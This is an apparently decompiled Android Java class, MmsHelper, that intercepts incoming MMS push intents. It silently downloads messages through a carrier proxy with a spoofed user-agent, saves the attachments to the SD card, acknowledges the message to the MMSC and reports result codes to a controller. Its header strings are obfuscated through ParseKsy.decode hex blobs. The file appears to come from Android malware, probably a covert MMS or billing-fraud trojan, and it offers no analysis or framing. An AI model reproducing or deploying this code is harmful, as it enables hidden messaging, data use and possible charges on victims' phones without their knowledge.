package net.workspace.mms;
import java.io.DataInputStream;
import java.io.FileOutputStream;
import net.workspace.http.HttpReportMmsc;
import net.workspace.listener.DownloadListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.ReportMmscListener;
import net.workspace.manager.ReportManager;
import net.workspace.network.NetworkController;
import net.workspace.util.Logger;
import net.workspace.util.ParseKsy;
import net.workspace.util.T;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import android.content.BroadcastReceiver;
import android.content.Intent;
import com.google.android.mms.InvalidHeaderValueException;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.NotificationInd;
import com.google.android.mms.pdu.NotifyRespInd;
import com.google.android.mms.pdu.PduBody;
import com.google.android.mms.pdu.PduComposer;
import com.google.android.mms.pdu.PduParser;
import com.google.android.mms.pdu.PduPart;
import com.google.android.mms.pdu.RetrieveConf;

public class MmsHelper implements DownloadListener {
    /**
     * "Accept"
     */
    private static final String ACCEPT = ParseKsy.decode("c7f8b63a5bde6ef05e3eae2c26fdd30c");
    /**
     * "Accept-Language"
     */
    private static final String ACCEPT_LANGUAGE = ParseKsy.decode("905c64b9500f9467e9f8d42bf992d0e8");
    /**
     * "user-agent"
     */
    private static final String USER_AGENT = ParseKsy.decode("7252c3a19f88487086a962cc638355be");
    /**
     *   "Mozilla/5.0(Linux;U;Android 2.1-update1;zh-cn;ZTE-C_N600/ZTE-C_N600V1.0.0B02;240*320;CTC/2.0)AppleWebkit/530.17(KHTML,like Gecko) Version/4.0 Mobile Safari/530.17";
     */
    private static final String MOZILLA_AGENT = ParseKsy
            .decode("8b668b65696a917d8055310685c685e5b8fc7368c870e715b88f0b5939ebaf9b86ed0e552a8ee8a14ae6612f5621f7ef1b547812eb11ee250c48aa06d50c74df5266068c441f6fdd6064566c62dd16561bc45ad50b49e94c3844628efdf6d04cda6aa5b6820e79eb3a86d8b2355eab594971cd06d72a3994b02e129188efb8f2987ae88949654d4d759ecab6d03359d3696c999502b9c41b87edbce6f1754203419c553ad9efbbd19f6ff5a14eacb1bc");
    /**
     *   application/vnd.wap.mms-message, application/vnd.wap.sic"
     */
    private static final String MEMI = ParseKsy.decode("a94fe24ec1742d9a565d4300e6fae87aa0d994b3df7cd59ca017cb67ef103642ddf500e911cec10e579bad4f09c2db956f2b278376d1caf806509add43b1f120");
    /**
     * "http.route.default-proxy"
     */
    private static final String HTTP_ROUTE_DEFAULT_PROXY = ParseKsy.decode("1b97090e8b0580c90c3e152f64d75bac0f945f679c657cd5ef43f4b5a1e07a49");
    private static String DATA = ParseKsy.decode("d6063dd0e501615cebdbda2a28cdb4bd");
    private byte tranctionID[];
    public void dealMsg(BroadcastReceiver broadcastreceiver, Intent intent) {
        byte abyte0[] = intent.getByteArrayExtra(DATA);
        if (abyte0 == null) { return;//
        }
        final PduParser parser = new PduParser(abyte0);
        final GenericPdu pdu = parser.parse();
        if (pdu == null) { return; }
        NetworkController.doNetworkTask(1, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    downLoadMms(parser, pdu);
                    if (tranctionID != null) {
                        report(tranctionID);
                    }
                }
            }
        });
    }
    private void downLoadMms(PduParser pduparser, GenericPdu genericpdu) {
        byte abyte1[];
        genericpdu.getMessageType();
        byte abyte0[] = ((NotificationInd) genericpdu).getContentLocation();
        String s = new String(abyte0);
        abyte1 = download(s);
        if (abyte1 == null) { return;//
        }
        PduParser pduparser1 = new PduParser(abyte1);
        GenericPdu genericpdu1 = pduparser1.parse();
        if (genericpdu1 == null) { return; }
        if (genericpdu1.getMessageType() != 132) return;
        RetrieveConf retrieveconf = (RetrieveConf) genericpdu1;
        tranctionID = retrieveconf.getTransactionId();
        PduBody pdubody = retrieveconf.getBody();
        if (pdubody == null) { return;//
        }
        int i;
        int j;
        i = pdubody.getPartsNum();
        j = 0;
        while (j < i) {
            PduPart pdupart = pdubody.getPart(j);
            new StringBuilder("PduPart");
            StringBuilder stringbuilder5;
            byte abyte5[];
            String s11;
            String s12;
            if (pdupart.getFilename() == null) {} else {
                byte abyte3[] = pdupart.getFilename();
                new String(abyte3);
            }
            stringbuilder5 = new StringBuilder("PduPart");
            stringbuilder5.append(j + 1).append(" ContentId is ");
            if (pdupart.getContentId() == null) {} else {
                byte abyte4[] = pdupart.getContentId();
                new String(abyte4);
            }
            abyte5 = pdupart.getData();
            s11 = new String(pdupart.getContentType());
            s12 = s11.substring(-4 + s11.length());
            if (s12.indexOf("/") != -1) s12 = s12.substring(1 + s12.indexOf("/"));
            if (s12.indexOf("*") != -1) s12 = "unknown";
            FileOutputStream fileoutputstream1 = null;
            try {
                fileoutputstream1 = new FileOutputStream(new StringBuilder("/sdcard/附件").append(j + 1).append(".").append(s12).toString());
                fileoutputstream1.write(abyte5);
                fileoutputstream1.flush();
            } catch (Throwable e) {
                Logger.error(e);
            } finally {
                try {
                    fileoutputstream1.close();
                } catch (Throwable e) {
                    Logger.error(e);
                }
            }
            j++;
        }
    }
    @Override
    public void onDownloadFinished(int i, String s, String s1, int j) {}
    @Override
    public void onDownloadProgress(String s, int i, int j, int k) {}
    private void report(byte abyte0[]) {
        try {
            NotifyRespInd notifyrespind = new NotifyRespInd(18, abyte0, 129);
            new HttpReportMmsc(T.MMSC, new PduComposer(T.context, notifyrespind).make(), T.PROXY, new ReportMmscListener() {
                @Override
                public void callback(int i) {
                    if (i == 200) {
                        ReportManager.reportMmsResult(1, "1", "");
                    } else {
                        ReportManager.reportMmsResult(1, "2", "114006");
                    }
                }
            }).connect();
        } catch (InvalidHeaderValueException e) {
            Logger.error(e);
        }
    }
    private byte[] download(String s) {
        byte result[] = null;
        DataInputStream datainputstream = null;
        try {
            T.setProxyMmsc(T.INFO.imsi);
            HttpHost httphost = new HttpHost(T.PROXY, 80);
            BasicHttpParams basichttpparams = new BasicHttpParams();
            basichttpparams.setParameter(HTTP_ROUTE_DEFAULT_PROXY, httphost);
            HttpConnectionParams.setConnectionTimeout(basichttpparams, 10000);
            DefaultHttpClient defaulthttpclient = new DefaultHttpClient(basichttpparams);
            HttpGet httpget = new HttpGet(s);
            httpget.addHeader(ACCEPT, MEMI);
            httpget.addHeader(ACCEPT_LANGUAGE, "");
            httpget.addHeader(USER_AGENT, MOZILLA_AGENT);
            HttpResponse httpresponse = defaulthttpclient.execute(httpget);
            StatusLine statusline = httpresponse.getStatusLine();
            if (statusline.getStatusCode() != 200) {
                result = null;
            } else {
                HttpEntity httpentity = httpresponse.getEntity();
                if (httpentity != null) {
                    datainputstream = new DataInputStream(httpentity.getContent());
                    result = new byte[(int) httpentity.getContentLength()];
                    datainputstream.readFully(result);
                }
            }
        } catch (Throwable e) {
            Logger.error(e);
        } finally {
            try {
                if (datainputstream != null) datainputstream.close();
            } catch (Exception exception) {
                result = null;
            }
        }
        return result;
    }
}
